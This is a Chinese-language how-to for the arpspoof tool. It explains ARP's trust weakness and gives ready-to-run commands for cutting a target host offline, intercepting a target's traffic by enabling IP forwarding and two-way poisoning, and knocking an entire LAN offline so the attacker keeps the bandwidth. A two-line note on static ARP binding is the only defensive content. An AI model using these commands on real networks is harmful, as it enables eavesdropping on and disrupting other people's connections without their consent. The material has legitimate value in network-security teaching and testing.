# arpspoof

地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址 获取物理地址（MAC地址）的一个TCP/IP协议。

主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。

地址解析协议是建立在网络中各个主机互相信任的基础上的，局域网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；


## 语法

arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host

## 参数

-t target  指定一个特殊的、将被ARP毒化的主机（如果没有指定，则认为是局域网中所有主机）。重复可以指定多个主机
host  host是你想要截获数据包的主机 (通常是网关)。
-i interface  指定要使用的接口（即指定一块网卡）
-r 捕获两个方向的网络流量, 默认只捕获target到host的流量

使用 `ip a`来查看网卡名称 

## 使用

`arpspoof -i eth0 -t 192.168.31.45  192.168.31.1`
-i 指定网卡
-t 目标哦主机
host 网关
这个命令的含义是获取目标主机发给网关的包

## 应用
### 让目标主机断网
截获目标主机发给网关的信息
`arpspoof -i eth0 -t 192.168.31.45  192.168.31.1`
### 截取目标主机信息
```sh
## 开启本机的转发功能 1表示开启, 0表示关闭
echo 1 > /proc/sys/net/ipv4/ip_forward 
arpspoof -i eth0 -t 192.168.31.45 -r 192.168.31.1
```
### 让整个个局域网断网
不用-t参数，那它就是指针对所有的主机发起欺骗, 让所有其他主机不能上网, 这时只要自己不被欺骗就可以独享网络.
`arpspoof -i eth0 网关IP`


### 防范中间人欺骗
arp欺骗攻击就是通过改变主机的映射表，即原来192.168.1.1指向的mac地址是a-b-c-d, 而有人在局域网内喊话说192.168.1.1是a-a-a-a 那你的电脑收到后就会改变

```sh
arp -a  # 查看arp缓存表, 可以看到iP和MAC是动态的
arp -s  192.168.31.1   ec-41-18-49-d4-30  # 静态绑定
```

## 参考

1. https://blog.csdn.net/qq_54780911/article/details/121891827
2. https://blog.csdn.net/qq_54780911/article/details/121957519